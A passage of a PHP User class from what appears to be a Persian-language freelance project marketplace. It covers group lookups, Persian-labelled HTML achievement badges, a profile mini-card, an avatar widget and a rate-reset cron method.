            return $database->fetchAll($database->join('groups', 'group_members', 'id', 'group_id', '*', $database->whereId($this->id, "user_id")));
        }
        if (isset($this->_info['groups']))
            return $this->_info['groups'];
        global $database;
        $groups = $database->fetchAll($database->join('groups', 'group_members', 'id', 'group_id', '*', $database->whereId($this->id, "user_id") . ' AND group_members.verified > 0'));
        $this->_info['groups'] = $groups;
        return $groups;
    }

    public function getActiveGroups() {
        global $database;
        $groups = $database->fetchAll($database->join('groups', 'group_members', 'id', 'group_id', '*', $database->whereId($this->id, "user_id") . ' AND group_members.verified > 0'));
        for ($index = 0; $index < count($groups); $index++) {
            $g = new Group($groups[$index]['id']);
            if (!$g->isValid()) {
                unset($groups[$index]);
            }
        }
        return $groups;
    }

    public function containGroup($group_id) {
        $groups = $this->getGroups();
        for ($index = 0; $index < count($groups); $index++) {
            if ($groups[$index]['id'] == $group_id) {
                return TRUE;
            }
        }
        return FALSE;
    }

//HHHHHHHHHHHHHHHHH  display  HHHHHHHHHHHHHHHHHHHHH
    public function displayRank() {
        global $message;
        $message->displayRank($this->rank, $this->rankers);
    }

    public function displayCups($rate = -1) {
        $count = 0;
        $out = '';
        if ($rate > 0 && $rate <= 10 && $this->isWorker()) {
            $count++;

            $out.= '<img class="help cup" style="cursor: help;" width="20" src="medias/images/icons/cup_green.png" alt="type cup"/>
            <div class="help_comment">
                ..:: رتبه برتر ::..
                <br/>        
                کسب رتبه ی 
                ' . $rate . '
                از بین مجریان
            </div>';
        }

        if ($this->finished_projects >= 50) {
            $count++;
            $out.='
            <img class="help cup" style="cursor: help;" width="20" src="medias/images/icons/cup_red.png" alt="type cup"/>
            <div class="help_comment">
                ..:: کاربر ماهر ::..
                <br/>
                انجام موفق بیش از 
                ' . $this->finished_projects . '    
                پروژه 
            </div>';
        } elseif ($this->finished_projects >= 10) {
            $count++;
            $out.='
            <img class="help cup" style="cursor: help;" width="20" src="medias/images/icons/cup_orange.png" alt="type cup"/>
            <div class="help_comment">
                ..:: کاربر با تجربه ::..
                <br/>
                انجام موفق بیش از
                ' . $this->finished_projects . '
                پروژه 
            </div>';
        }
        $rankers = ($this->rankers == 0 ? 1 : $this->rankers);
        if ($this->rank / $rankers >= 9) {
            $count++;
            $out.='
            <img class="help cup" style="cursor: help;" width="20" src="medias/images/icons/cup_blue.png" alt="type cup"/>
            <div class="help_comment">
                ..::کاربر ممتاز ::..
                <br/>
                دریافت امتیاز عالی از کارفرما
            </div>';
        }

        if ($this->special_type == User::$S_SPECIAL) {
            $count++;
            $out.='
            <img class="help cup" style="cursor: help;" width="20" src="medias/images/icons/cup_purple.png" alt="type cup"/>
            <div class="help_comment">
                ..:: کاربر ویژه ::..
                <br/>
                کسب نشان کاربر ویژه
            </div>';
        }

        if ($this->isAgency()) {
            $count++;
            $out.='
            <img class="help cup" style="cursor: help;" width="20" src="medias/images/icons/cup_purple.png" alt="type cup"/>
            <div class="help_comment">
                ..::  نماینده ::..
                <br/>
نماینده تایید شده مرکز
</div>';
        }

        if ($this->rejected_projects > 0 && !$this->isAgency()) {
            $count++;
            $out.='
            <img class="help cup" style="cursor: help;" width="20" src="medias/images/icons/cup_gray.png" alt="type cup"/>
            <div class="help_comment">
                ..:: کاربر خاطی ::..
                <br/>
                انجام نا موفق  
                ' . $this->rejected_projects . '    
                پروژه 
            </div>';
        }

        return $out;
    }

    public function displayMiniInfo($showLink, $showAvatar, $showRate, $rate = -1, $showOnline = FALSE) {
        global $_CONFIGS, $message;
        $rankers = $this->rankers;
        $rank = $this->rank;
        $rankers = ($rankers == 0 ? 1 : $rankers);
        $rank = round(($rank * 10) / $rankers) / 10;
        if ($this->isAgency())
            $rate = 1;
        else
            $rate = $rate == -1 ? $this->rate : $rate;
        $u = $this;
        $out = '<div class="user-mini-info" style="padding: 0px;">

            <div class=""  style="">
                <div class="bg-theme" style="padding: 8px;z-index: 1;">
                    <a href="user_' . $u->id . '" class=""  target="_blank" style="font-size:17px; color: #FFF;">
                        ' . $this->getNickname() . '<br/>';
        if (!$showAvatar) {
            $out .= '<span style="font-size:10px">
پروژه‌های  در حال اجرا:
                        </span>'
                    . ($this->running_projects > 0 ? $this->running_projects : '0' );
        }
        $out .= '</a>
                    <br/>
                </div>
                <div style="padding: 5px 5px 5px 1px;margin-top: -30px;">';
        if ($showAvatar)
            $out .= '<img  width="40" height="40" style="float:right;" class="user-avator" align="absmiddle" src="' . $_CONFIGS['Site']['Path'] . 'user/avatar/UA_' . $u->id . '.png" />';

        $out .= '<div style="padding-top: 5px;">';

        if (!$showAvatar) {
            if ($showOnline) {
                $isOnline = $this->isOnline();
                $color = $isOnline ? 'green' : 'red';
                $text = $isOnline ? 'آنلاین' : 'آفلاین';
                $out .= '<span style="float:right;font-size:10px;margin-top:5px;color:' . $color . '"><span style="font-size:25px;">0</span>' . $text . '</span>';
            } else {
                $out .= '<span class="english" style="float:right;font-size:10px;margin-top:20px;">' . $this->getCode() . '</span>';
            }
        }
        $out .= '<div style="text-align:left;padding-left:1px">';

        if ($showLink)
            $out .= '<a href="send-message_' . $u->id . '" class="" target="_blank">'
                    . '<img src="medias/images/icons/message_w.png"  width="16" height="16" > '
                    . '</a>'
                    . '<a href="user_' . $u->id . '" class="" target="_blank">'
                    . '<img src="medias/images/icons/user_info_w.png"  width="16" height="16" > '
                    . '</a>'
                    . '<a href="submit-project?private_typist_id=' . $u->id . '&pt=Private" class="" target="_blank">'
                    . '<img src="medias/images/icons/write_w.png"  width="16" height="16" > '
                    . '</a>';
        $out .= '<br/>'
                . $this->displayCups($rate) . '
                    </div>
                    <div class="clear"></div>
                </div>
                </div>
                <div style="">

                    <div style="display:inline-block;width:30%">'
                . $rank . '
                        <br/>
                        <span style="font-size:10px">
                            امتیاز
                        </span>
                        <br/>
                    </div>';
        if ($showRate) {
            $out.= '<div style="margin-top:-10px;display:inline-block;width:30%">';
            $out.= '<span style="color:red;font-size: 18px;">' . $rate . '</span><br/>';
            if ($showAvatar) {
                $out.= '<img style="margin-bottom:-20px;z-index:3" class="" align="absmiddle" src="medias/images/icons/rate_medal.png" />';
            } else {
                $out.= 'رتبه';
            }
            $out.= '</div>';
        } else {
            $out.= '<div style="display:inline-block;width:30%">'
                    . ($this->running_projects ? $this->running_projects : '0' ) . '
                        <br/>
                        <span style="font-size:10px">
                            در حال اجرا
                        </span>
                        <br/>
                    </div>';
        }

        $out.= '<div style="display:inline-block;width:30%">
                        ' . ($this->finished_projects ? $this->finished_projects : '0' ) . '
                        <br/>
                        <span style="font-size:10px">
کل پروژه‌ها
                        </span>
                        <br/>
                    </div>
                </div>
                <div class="bg-theme" style="padding: 4px;">
                </div>
            </div>
        </div>';

        return $out;
    }

    public function displayAvator($showOnline = FALSE, $lazy = FALSE) {
        $color = $this->isWorker() ? '' : 'br-theme';
        $a = ' <span class="' . ($lazy ? "" : "help") . ' user" style="" title="' . $this->getNickname() . '">'
                . '<a href="user_' . $this->id . '" class="popup"> '
                . '<img class="user-avator ' . $color . '"  src="http://bargardoon.com/user/avatar/UA_' . $this->id . '.png" width="40" height="40" />'
                . '</a> '
                . '</span> ';
        if (!$lazy)
            $a.=' <div class="help_comment" >' . $this->displayMiniInfo(FALSE, FALSE, TRUE, -1, $showOnline) . '</div>';
        return $a;
    }

    //HHHHHHHHHHHHHHHHH  cronjobs HHHHHHHHHHHHHHHHHHHHH

    public function resetAllRate() {
        global $database;
        $database->update('users_sub', array('rate' => 0));
    }

}

?>